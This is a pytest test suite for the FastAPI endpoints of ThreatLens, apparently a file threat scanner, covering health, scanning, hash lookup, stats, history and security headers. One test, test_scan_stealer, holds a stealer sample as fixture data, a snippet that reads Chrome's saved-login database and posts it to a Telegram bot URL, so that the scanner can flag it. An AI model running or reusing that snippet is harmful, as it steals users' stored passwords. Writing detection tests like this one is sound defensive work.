"""Tests for FastAPI web API endpoints."""

import os
import sys
import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from fastapi.testclient import TestClient
from threatlens.web.app import app

client = TestClient(app)


class TestHealthEndpoint:
    def test_health(self):
        r = client.get("/health")
        assert r.status_code == 200
        assert r.json()["status"] == "ok"


class TestIndexPage:
    def test_index_returns_html(self):
        r = client.get("/")
        assert r.status_code == 200
        assert "ThreatLens" in r.text
        assert "text/html" in r.headers["content-type"]


class TestSecurityHeaders:
    def test_x_content_type_options(self):
        r = client.get("/health")
        assert r.headers.get("x-content-type-options") == "nosniff"

    def test_x_frame_options(self):
        r = client.get("/health")
        assert r.headers.get("x-frame-options") == "DENY"


class TestScanEndpoint:
    def test_scan_clean_file(self):
        content = b"def add(a, b): return a + b\nprint(add(2, 3))\n"
        r = client.post("/api/scan", files={"file": ("clean.py", content)}, data={"ai": "false"})
        assert r.status_code == 200
        data = r.json()
        assert data["risk_level"] == "LOW"
        assert data["sha256"]
        assert len(data["sha256"]) == 64

    def test_scan_stealer(self):
        content = (
            b"import os, requests\n"
            b"chrome = os.path.expanduser('~\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data')\n"
            b"requests.post('https://api.telegram.org/bot123/send', data={'f': open(chrome).read()})\n"
        )
        r = client.post("/api/scan", files={"file": ("hack.py", content)}, data={"ai": "false"})
        assert r.status_code == 200
        data = r.json()
        assert data["risk_level"] in ("HIGH", "CRITICAL")
        assert data["risk_score"] >= 40
        assert len(data["findings"]) > 0

    def test_scan_empty_file(self):
        r = client.post("/api/scan", files={"file": ("empty.bin", b"")}, data={"ai": "false"})
        # Empty files should still return a response (either 200 or 400)
        assert r.status_code in (200, 400)

    def test_scan_no_file(self):
        r = client.post("/api/scan", data={"ai": "false"})
        assert r.status_code == 422  # FastAPI validation error

    def test_scan_returns_all_fields(self):
        r = client.post("/api/scan", files={"file": ("test.txt", b"hello world")}, data={"ai": "false"})
        assert r.status_code == 200
        data = r.json()
        required_fields = ["file", "size", "type", "md5", "sha256", "risk_score", "risk_level", "findings", "recommendations"]
        for field in required_fields:
            assert field in data, f"Missing field: {field}"


class TestLookupEndpoint:
    def test_lookup_not_found(self):
        r = client.get("/api/lookup/aabbccddee112233")
        assert r.status_code == 404

    def test_lookup_invalid_hash(self):
        r = client.get("/api/lookup/not_a_hex_hash!!!")
        assert r.status_code == 400

    def test_lookup_after_scan(self):
        # Scan first
        scan_r = client.post("/api/scan", files={"file": ("test.txt", b"lookup test content")}, data={"ai": "false"})
        if scan_r.status_code == 200:
            sha256 = scan_r.json().get("sha256", "")
            if sha256:
                # Lookup by full hash
                r = client.get(f"/api/lookup/{sha256}")
                assert r.status_code == 200
                assert r.json()["risk_level"]


class TestStatsEndpoint:
    def test_stats(self):
        r = client.get("/api/stats")
        assert r.status_code == 200
        data = r.json()
        assert "total_files" in data
        assert "total_scans" in data


class TestHistoryEndpoint:
    def test_history(self):
        r = client.get("/api/history?limit=10")
        assert r.status_code == 200
        data = r.json()
        assert isinstance(data, list)

    def test_history_limit(self):
        r = client.get("/api/history?limit=5")
        assert r.status_code == 200
        assert len(r.json()) <= 5


class TestRateLimiting:
    def test_not_blocked_under_limit(self):
        # First few requests should succeed
        r = client.post("/api/scan", files={"file": ("t.txt", b"test")}, data={"ai": "false"})
        assert r.status_code == 200
